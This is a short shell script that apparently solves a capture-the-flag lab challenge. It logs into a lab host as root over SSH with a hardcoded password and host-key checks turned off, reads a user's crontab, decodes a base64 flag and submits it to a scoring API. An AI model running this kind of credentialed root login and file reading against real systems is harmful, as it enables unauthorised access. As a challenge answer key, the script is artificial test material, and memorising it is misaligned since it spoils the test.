#!/bin/sh
set -eu

HOST='172.20.0.141'
USER='root'
PASSWORD='relay-archive-42'

nmap -Pn -p 22 --open "$HOST" >/dev/null
artifact="$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$HOST" 'cat /var/spool/cron/crontabs/svc_relaymon')"
encoded="$(printf '%s\n' "$artifact" | python3 -c 'import re,sys; m=re.search(r"/usr/bin/printf\s+\x27%s\x27\s+\x27([A-Za-z0-9+/=]+)\x27", sys.stdin.read()); sys.exit("encoded evidence not found") if not m else print(m.group(1))')"
flag="$(printf '%s' "$encoded" | python3 -c 'import base64,sys; print(base64.b64decode(sys.stdin.buffer.read(), validate=True).decode(), end="")')"
payload="$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-a6a766","task_id":"task1","flag":sys.argv[1]}))' "$flag")"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
